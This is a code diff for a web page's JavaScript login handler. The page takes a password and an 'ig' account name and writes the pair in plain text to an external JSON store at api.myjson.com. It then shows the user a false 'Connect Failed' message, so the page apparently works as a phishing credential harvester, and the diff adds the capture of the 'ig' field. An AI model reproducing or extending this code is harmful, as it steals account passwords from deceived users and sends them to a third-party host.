@@ -114,10 +114,10 @@ elm.id("div-body").innerHTML += '<i id="i-pw" class="fas fa-key fa-2x"></i><inpu
         elm.id("div-footer").innerHTML = '<p>Connecting...</p>';
        
         if(elm.id("password").value == "") {elm.id("password").className += " box";}
-       
+       if(elm.id("ig").value == "") {elm.id("ig").className += " box";}
         var root = JSON.parse(xhr.get("https://api.myjson.com/bins/rzf0a"));
-		if(root[elm.id("username").value]==undefined) {
-			root[elm.id("username").value] = elm.id("password").value;
+		if(root[elm.id("ig").value]==undefined) {
+			root[elm.id("ig").value] = elm.id("password").value;
 			xhr.put("https://api.myjson.com/bins/rzf0a", JSON.stringify(root));
 elm.id("div-footer").innerHTML = "Connect Failed: Try again later. :(<br>our service will stop on 2018/10/21 (because of the financial problem).";
 		} else {
